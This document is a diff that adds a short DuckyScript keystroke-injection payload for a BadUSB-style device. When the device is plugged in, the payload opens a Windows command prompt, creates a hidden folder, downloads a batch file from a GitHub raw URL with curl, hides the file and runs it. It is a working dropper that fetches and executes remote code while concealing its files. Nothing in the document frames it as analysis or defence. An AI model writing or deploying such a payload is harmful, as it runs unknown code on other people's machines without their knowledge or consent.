@@ -1,0 +1,29 @@
+DEFAULTDELAY 50
+
+GUI r
+STRING cmd
+ENTER
+
+STRING cd ../../
+ENTER
+
+STRING mkdir Deez
+ENTER
+
+STRING attrib +h Deez
+ENTER
+
+STRING cd Deez
+ENTER
+
+STRING type nul > Nuts.bat
+ENTER
+
+STRING curl https://raw.githubusercontent.com/Wojtek9388/Batch-Testing/refs/heads/main/System-Hardware.bat > Nuts.bat
+ENTER
+
+STRING attrib +h Nuts.bat
+ENTER
+
+STRING start Nuts.bat && exit
+ENTER
